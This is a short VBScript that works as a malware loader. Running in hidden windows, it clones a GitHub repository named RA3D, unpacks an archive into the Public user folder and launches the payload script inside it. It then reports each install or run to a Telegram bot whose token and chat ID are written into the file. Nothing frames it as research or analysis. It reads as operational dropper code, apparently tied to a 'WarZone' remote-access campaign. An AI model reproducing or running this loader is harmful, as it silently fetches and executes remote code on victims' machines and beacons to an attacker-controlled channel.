Set objFSO = CreateObject("Scripting.FileSystemObject")
set oShell = Wscript.CreateObject("Wscript.Shell")

token = "5319490970:AAHysb-VELFVh6_sFu6WbYSL5qdfUiB1cQI"
chat_id = "5176730926"

dir = objFSO.GetParentFolderName(WScript.ScriptFullName)
git = "C:\Users\RA3D\Desktop\NewHack\Git\mingw64\bin\git.exe"
warzone = "https://github.com/UQABXO/RA3D"

If objFSO.FolderExists("C:\Users\Public\RA3D") = False Then
	oShell.Run "cmd.exe /c rmdir %temp%\RA3D /S /Q",0,True
	oShell.Run "cmd.exe /c " + git + " clone " + warzone + " %temp%\RA3D",0,True
	oShell.Run "cmd.exe /c %temp%\RA3D\7z.exe x %temp%\RA3D\RA3D.zip -o""C:\Users\Public""",0,True
	oShell.Run "C:\Users\Public\RA3D\Main.vbs",0,False
	text = "%F0%9F%93%8C%20RA3D%20Loader%20Installed%20%26%20Executed.%0A"
Else
	text = "%F0%9F%93%8C%20RA3D%20Loader%20Executed.%0A"
	oShell.Run "C:\Users\Public\RA3D\Main.vbs",0,False
End If

' Notification '
oShell.Run "curl.exe -k https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text + "--WarZone--",0,True
